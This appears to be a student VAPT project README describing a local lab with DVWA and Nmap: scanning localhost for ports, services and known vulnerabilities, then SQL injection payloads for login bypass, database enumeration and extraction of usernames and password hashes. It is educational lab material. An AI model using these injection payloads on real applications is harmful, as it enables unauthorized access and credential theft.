\# Vulnerability Assessment and Penetration Testing (VAPT) using DVWA and Nmap



\## Introduction

This project demonstrates a complete Vulnerability Assessment and Penetration Testing (VAPT) process performed on a local web application using industry-standard tools. The main aim of this project is to understand how attackers identify vulnerabilities and how web applications can be tested for security weaknesses.



The project uses \*\*DVWA (Damn Vulnerable Web Application)\*\* as the target application and \*\*Nmap\*\* for network scanning and vulnerability detection. All testing is performed in a \*\*local environment\*\* strictly for educational purposes.



---



\## Objectives of the Project

\- To understand the basics of Vulnerability Assessment and Penetration Testing (VAPT)

\- To perform network scanning using Nmap

\- To identify open ports and running services

\- To detect vulnerabilities using Nmap scripts

\- To understand SQL Injection attacks using DVWA

\- To gain hands-on experience with ethical hacking tools



---



\## Tools and Technologies Used

\- Operating System: Kali Linux

\- Web Server: Apache

\- Database: MySQL

\- Web Application: DVWA

\- Network Scanning Tool: Nmap

\- Browser: Firefox



---



\## Project Environment Setup



\### Installation of Apache, PHP, and MySQL

```bash

sudo apt update

sudo apt install apache2 php mysql-server php-mysqli -y

```



\### Starting and Checking Services

```bash

sudo service apache2 start

sudo service mysql start

sudo service apache2 status

sudo service mysql status

```



---



\## DVWA Configuration

\- DVWA was installed inside the Apache web directory

\- Configuration file was updated with database credentials

\- Database was created using the DVWA setup page

\- Security level was set to \*\*Low\*\* for testing purposes



---



\## Network Scanning Using Nmap



\### Basic Port Scan

```bash

nmap 127.0.0.1

```

This scan identifies open ports on the local machine.



\### Service and Version Detection

```bash

nmap -sV 127.0.0.1

```

This scan detects running services and their versions.



\### Vulnerability Scan Using Nmap Scripts

```bash

nmap --script vuln 127.0.0.1

```

This scan checks for known vulnerabilities using Nmap NSE scripts.



---



\## SQL Injection Testing using DVWA



\### SQL Injection Login Bypass

```sql

' OR '1'='1

```

This payload bypasses authentication by making the condition always true.



\### Database Enumeration

```sql

' UNION SELECT database(), user()-- -

```

This payload retrieves database information.



\### Extracting Users and Passwords

```sql

' UNION SELECT user, password FROM users-- -

```

This payload extracts usernames and hashed passwords from the database.



---



\## Results and Observations

\- Open ports such as HTTP (80) and MySQL (3306) were identified

\- Apache and MySQL services were successfully detected

\- Vulnerabilities were identified using Nmap scripts

\- SQL Injection vulnerabilities were successfully exploited in DVWA

\- User credentials were extracted due to insecure input validation



---



\## Conclusion

This project successfully demonstrates the Vulnerability Assessment and Penetration Testing (VAPT) process on a vulnerable web application. It highlights the importance of secure coding practices, proper input validation, and regular security testing. Tools like Nmap and DVWA are highly effective for learning and understanding real-world web security issues.



---



\## Disclaimer

This project is created \*\*strictly for educational purposes\*\*. All testing was performed on a local environment intentionally designed to be vulnerable. Unauthorized testing on real systems without permission is illegal and unethical.

